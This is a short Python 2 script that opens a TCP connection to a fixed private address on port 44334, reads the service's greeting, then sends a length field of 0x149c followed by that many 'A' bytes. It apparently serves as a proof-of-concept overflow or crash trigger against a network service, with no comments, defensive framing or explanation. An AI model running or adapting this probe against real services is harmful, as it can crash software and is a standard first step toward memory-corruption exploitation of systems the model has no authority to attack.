import os
import socket
import struct
import string

def g():
     fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         fd.connect(('192.168.66.160', 44334))
         fd.recv(10)
         fd.recv(256)
         fd.send(struct.pack('!L', 0x149c))
         astr = 'A'*0x149c
         fd.send(astr)

     except Exception, e:
         print e
         pass

     fd.close()

g()

